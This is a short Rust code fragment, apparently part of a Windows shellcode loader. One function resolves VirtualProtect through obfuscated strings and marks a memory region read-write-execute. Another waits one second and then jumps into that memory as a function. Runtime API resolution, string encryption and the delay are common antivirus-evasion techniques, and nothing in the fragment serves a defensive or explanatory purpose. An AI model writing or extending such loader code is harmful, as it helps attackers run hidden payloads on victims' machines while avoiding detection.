#[inline(never)]
async fn set_rwx(addr: *const u8, size: usize) {
    unsafe {
        let mut old_protect = 0;
        if let Some(vp) = resolve::<win_fn::FnVirtualProtect>(ss!("kernel32.dll"), ss!("VirtualProtect")) {
            vp(addr as *mut c_void, size, 0x40, &mut old_protect);
        }
    }
}

#[inline(never)]
async fn run(addr: *const u8) {
    ::lib::__tokio::time::sleep(std::time::Duration::from_secs(1)).await;

    unsafe {
        let func: extern "C" fn() = std::mem::transmute(addr);
        func();
    }
}

